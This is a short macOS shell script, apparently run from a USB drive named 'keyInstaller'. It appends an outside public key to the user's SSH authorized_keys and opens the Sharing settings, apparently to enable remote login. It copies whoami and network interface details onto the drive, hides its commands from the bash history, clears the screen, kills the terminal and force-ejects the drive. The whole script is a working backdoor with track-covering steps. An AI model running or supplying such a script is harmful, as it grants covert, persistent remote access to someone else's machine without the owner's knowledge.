#! /bin/sh
mv ~/.bash_history /Volumes/keyInstaller/
open /System/Library/PreferencePanes/SharingPref.prefPane/ && cat /Volumes/keyInstaller/id_rsa.pub >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && whoami >> /Volumes/keyInstaller/whoamis.txt && echo "---------------------------------------------------------------------" >> /Volumes/keyInstaller/hostnames.txt && ifconfig >> /Volumes/keyInstaller/hostnames.txt && toeject=$(df -h | grep /Volumes/keyInstaller) && toeject=${toeject:0:12}
mv /Volumes/keyInstaller/.bash_history ~/
clear
kill -9 $(ps -p $(ps -p $PPID -o ppid=) -o ppid=) 
diskutil unmount $toeject
diskutil unmountDisk force $toeject